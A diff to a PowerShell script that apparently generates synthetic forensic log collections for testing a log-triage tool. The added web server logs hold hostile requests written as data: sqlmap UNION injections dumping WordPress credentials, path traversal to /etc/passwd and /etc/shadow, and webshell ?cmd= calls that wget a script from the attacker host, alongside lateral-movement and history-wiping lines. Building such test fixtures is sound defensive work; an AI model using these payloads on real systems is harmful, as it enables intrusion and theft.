@@ -41,7 +41,9 @@ if (-not (Test-Path $tar)) { throw "tar.exe not found at $tar" }
 
 if (Test-Path $Path) {
     if (-not $Force) { throw "$Path already exists. Use -Force to recreate it." }
-    Remove-Item $Path -Recurse -Force
+    # [IO.Directory] with \\?\ instead of Remove-Item: "[root]" is a wildcard to
+    # Remove-Item, and journal paths can exceed MAX_PATH (260) in deep folders.
+    [IO.Directory]::Delete('\\?\' + (Resolve-Path -LiteralPath $Path).ProviderPath, $true)
 }
 
 $upload     = Join-Path $Path 'Upload'
@@ -165,6 +167,89 @@ function New-Collection([string]$name, [string]$host_, [string]$day) {
         "scp /tmp/.x.sh root@${nextIp}:/tmp/.x.sh"
         'history -c'
     )
+
+    # ── Web server logs (combined format, host-local time +0100) ──
+    # Scenario: Nikto scan, sqlmap SQLi, LFI that returned /etc/passwd,
+    # WordPress login brute force (fails = 200, success = 302), webshell
+    # upload + commands via ?cmd=, normal traffic, a vhost-format log and a
+    # rotated .gz from the day before.
+    $wd = (Get-Date "2026-11-$day").ToString('dd/MMM/yyyy', [Globalization.CultureInfo]::InvariantCulture)
+    $wdPrev = (Get-Date "2026-11-$day").AddDays(-1).ToString('dd/MMM/yyyy', [Globalization.CultureInfo]::InvariantCulture)
+    $ua  = '"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36"'
+    function W([string]$ip, [string]$t, [string]$req, [int]$st, [int]$sz, [string]$agent, [string]$date = $wd) {
+        "$ip - - [${date}:$t +0100] `"$req`" $st $sz `"-`" $agent"
+    }
+    $access = @(
+        (W '198.51.100.77' '09:58:10' 'GET / HTTP/1.1' 200 5120 $ua)
+        (W '198.51.100.77' '09:58:11' 'GET /wp-content/themes/site/style.css HTTP/1.1' 200 8812 $ua)
+        (W '198.51.100.77' '09:58:30' 'GET /?s=union+station+opening+hours HTTP/1.1' 200 4100 $ua)
+        (W '198.51.100.78' '09:59:02' 'GET /wp-admin/ HTTP/1.1' 302 0 $ua)
+        # Nikto scan — all 404
+        (W '203.0.113.99' '10:01:00' 'GET /.env HTTP/1.1' 404 196 '"Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000001)"')
+        (W '203.0.113.99' '10:01:00' 'GET /.git/config HTTP/1.1' 404 196 '"Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000002)"')
+        (W '203.0.113.99' '10:01:01' 'GET /phpmyadmin/ HTTP/1.1' 404 196 '"Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000003)"')
+        (W '203.0.113.99' '10:01:01' 'GET /cgi-bin/test.cgi HTTP/1.1' 404 196 '"Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000004)"')
+        (W '203.0.113.99' '10:01:02' 'GET /wp-config.php.bak HTTP/1.1' 404 196 '"Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000005)"')
+        # sqlmap SQL injection (URL-encoded, as it appears in real logs)
+        (W '203.0.113.99' '10:05:13' 'GET /products.php?id=1%27%20AND%201%3D1--%20- HTTP/1.1' 200 4300 '"sqlmap/1.7.11#stable (https://sqlmap.org)"')
+        (W '203.0.113.99' '10:05:20' 'GET /products.php?id=1%27%20UNION%20ALL%20SELECT%20NULL%2Cconcat(user_login%2C0x3a%2Cuser_pass)%2CNULL%20FROM%20wp_users--%20- HTTP/1.1' 200 4820 '"sqlmap/1.7.11#stable (https://sqlmap.org)"')
+        # LFI — returned the passwd file (200, ~2.4 kB)
+        (W '203.0.113.99' '10:08:44' 'GET /index.php?page=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1' 200 2450 $ua)
+    )
+    # WordPress brute force: failures are 200 (login page re-rendered), success is 302
+    for ($i = 0; $i -lt 14; $i++) {
+        $access += (W '203.0.113.45' ('10:1{0}:{1:00}' -f [math]::Floor($i / 6), (($i % 6) * 9 + 3)) 'POST /wp-login.php HTTP/1.1' 200 3410 '"python-requests/2.31.0"')
+    }
+    $access += @(
+        (W '203.0.113.45' '10:13:40' 'POST /wp-login.php HTTP/1.1' 302 0 '"python-requests/2.31.0"')
+        (W '203.0.113.45' '10:13:41' 'GET /wp-admin/ HTTP/1.1' 200 52000 '"python-requests/2.31.0"')
+        # Webshell upload via plugin installer, then commands
+        (W '203.0.113.45' '10:15:02' 'POST /wp-admin/update.php?action=upload-plugin HTTP/1.1' 200 1800 '"python-requests/2.31.0"')
+        (W '203.0.113.45' '10:15:30' 'GET /wp-content/uploads/2026/11/img.php?cmd=id HTTP/1.1' 200 54 '"python-requests/2.31.0"')
+        (W '203.0.113.45' '10:16:05' 'GET /wp-content/uploads/2026/11/img.php?cmd=wget%20http%3A%2F%2F203.0.113.45%2Fx.sh%20-O%20%2Ftmp%2F.x.sh HTTP/1.1' 200 0 '"python-requests/2.31.0"')
+        (W '203.0.113.45' '10:16:20' 'POST /wp-content/uploads/2026/11/img.php HTTP/1.1' 200 12 '"python-requests/2.31.0"')
+        (W '198.51.100.77' '10:30:00' 'GET /about/ HTTP/1.1' 200 6100 $ua)
+    )
+    Write-LfFile "$sys\var\log\apache2\access.log" $access
+    Write-LfFile "$sys\var\log\apache2\error.log" @(
+        ("[Mon Nov {0:00} 10:08:44.120000 2026] [php:warn] [pid 2211] [client 203.0.113.99:51120] PHP Warning:  include(): Failed opening '../../../../etc/passwd' for inclusion" -f $d)
+        ("[Mon Nov {0:00} 10:05:20.900000 2026] [security2:error] [pid 2215] [client 203.0.113.99:51133] ModSecurity: Access denied with code 403 (phase 2). [file `"/usr/share/modsecurity-crs/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf`"] [id `"942100`"] [msg `"SQL Injection Attack Detected via libinjection`"] [hostname `"shop.example.com`"] [uri `"/checkout.php`"]" -f $d)
+        ("[Mon Nov {0:00} 10:09:00.000000 2026] [core:error] [pid 2219] [client 198.51.100.77:50001] AH00128: File does not exist: /var/www/html/favicon.ico" -f $d)
+        ("[Mon Nov {0:00} 10:15:30.410000 2026] [php:notice] [pid 2240] [client 203.0.113.45:51990] PHP Warning:  system(): Unable to fork [id]" -f $d)
+        # stderr of the webshell's wget lands in error.log with no prefix
+        ("--2026-11-{0:00} 10:16:05--  http://203.0.113.45/x.sh" -f $d)
+        'Connecting to 203.0.113.45:80... connected.'
+        'sh: 1: chmod: Operation not permitted'
+    )
+    Write-LfFile "$sys\var\log\nginx\error.log" @(
+        ("2026/11/{0:00} 10:02:00 [error] 812#812: *41 open() `"/usr/share/nginx/html/index.php`" failed (2: No such file or directory), client: 198.51.100.77, server: _, request: `"GET /index.php HTTP/1.1`"" -f $d)
+        ("2026/11/{0:00} 10:02:30 [alert] 810#810: worker process 812 exited on signal 11" -f $d)
+    )
+    # common log format (no referer/agent) — old apache2 config
+    Write-LfFile "$sys\var\log\apache2\ssl_access.log" @(
+        ("203.0.113.99 - - [${wd}:10:21:00 +0100] `"GET /download.php?file=....//....//etc/passwd HTTP/1.1`" 200 2450")
+        ("198.51.100.77 - - [${wd}:10:21:05 +0100] `"GET /index.html HTTP/1.1`" 200 512")
+    )
+    # vhost_combined format (Debian other_vhosts_access.log): "vhost:port ip - - [...]"
+    Write-LfFile "$sys\var\log\apache2\other_vhosts_access.log" @(
+        ("shop.example.com:443 203.0.113.99 - - [${wd}:10:20:00 +0100] `"GET /checkout.php?id=1%20UNION%20SELECT%201,2,3-- HTTP/1.1`" 200 900 `"-`" `"sqlmap/1.7.11#stable (https://sqlmap.org)`"")
+        ("shop.example.com:443 198.51.100.77 - - [${wd}:10:20:05 +0100] `"GET / HTTP/1.1`" 200 7000 `"-`" $ua")
+    )
+    # nginx (same format)
+    Write-LfFile "$sys\var\log\nginx\access.log" @(
+        (W '203.0.113.99' '10:02:00' 'GET /..%2f..%2f..%2f..%2fetc%2fshadow HTTP/1.1' 400 150 '"curl/8.4.0"')
+        (W '198.51.100.77' '10:02:10' 'GET /health HTTP/1.1' 200 2 '"kube-probe/1.29"')
+    )
+    # Rotated, gzipped log from the previous day: early recon
+    $gzLines = @(
+        (W '203.0.113.99' '22:40:00' 'GET /xmlrpc.php HTTP/1.1' 405 42 '"masscan/1.3 (https://github.com/robertdavidgraham/masscan)"' $wdPrev)
+        (W '203.0.113.99' '22:40:05' 'GET /wp-json/wp/v2/users HTTP/1.1' 200 900 '"WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)"' $wdPrev)
+    )
+    $gzPath = "$sys\var\log\apache2\access.log.2.gz"
+    $bytes = $utf8.GetBytes(($gzLines -join "`n") + "`n")
+    $fs = [IO.File]::Create($gzPath)
+    $gz = New-Object IO.Compression.GZipStream($fs, [IO.Compression.CompressionMode]::Compress)
+    $gz.Write($bytes, 0, $bytes.Length); $gz.Dispose(); $fs.Dispose()
 
     # ── Crontab definitions: benign (Info), Suspicious (MEDIUM), Critical (HIGH) ──
     Write-LfFile "$sys\etc\crontab" @(
